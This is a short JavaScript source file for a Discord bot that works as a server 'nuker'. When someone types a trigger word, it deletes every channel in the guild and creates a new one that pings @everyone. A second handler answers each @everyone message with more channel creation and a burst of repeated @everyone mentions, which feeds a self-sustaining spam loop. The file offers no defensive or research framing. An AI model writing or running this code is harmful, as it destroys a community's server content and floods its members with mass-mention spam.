const Discord = require("discord.js")
const client = new Discord.Client(
    { intents: ["GUILDS", "GUILD_MEMBERS", "GUILD_MESSAGES"] }
)

client.login(process.env.token)


client.on('message', async (message) => {
    if (message.content === ('CIAO') )
      { 
     message.guild.channels.cache.forEach
          (channel => channel.delete());
   
          await message.guild.channels.create
          ('﷽ ', {
              type : 'text'
          }).then(async channel=> {
          channel.send('@everyone')
          })
      }
  })
   
   
  client.on('message', async (message) => {
      if (message.content === '@everyone') {
          await message.guild.channels.create
          ('﷽', {
              type : 'text'
          }).then(async channel=> {
            channel.send('@everyone ')
          message.channel.send('@everyone ')
          message.channel.send('@everyone ')
          message.channel.send('@everyone ')
          message.channel.send('@everyone ')
          message.channel.send('@everyone ')
          message.channel.send('@everyone ')
          message.channel.send('@everyone ')
          message.channel.send('@everyone ')
          message.channel.send('@everyone ')
          message.channel.send('@everyone ')
      })

    }})
